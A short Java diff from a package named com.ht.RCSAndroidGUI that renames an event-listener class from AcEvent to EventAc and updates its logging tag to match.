@@ -9,9 +9,9 @@ import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.listener.ListenerAc;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
-public class AcEvent extends EventBase implements Observer<Ac> {
+public class EventAc extends EventBase implements Observer<Ac> {
 	/** The Constant TAG. */
-	private static final String TAG = "AcEvent";
+	private static final String TAG = "EventAc";
 
 	private int actionOnExit, actionOnEnter;
 	private boolean inRange = false;
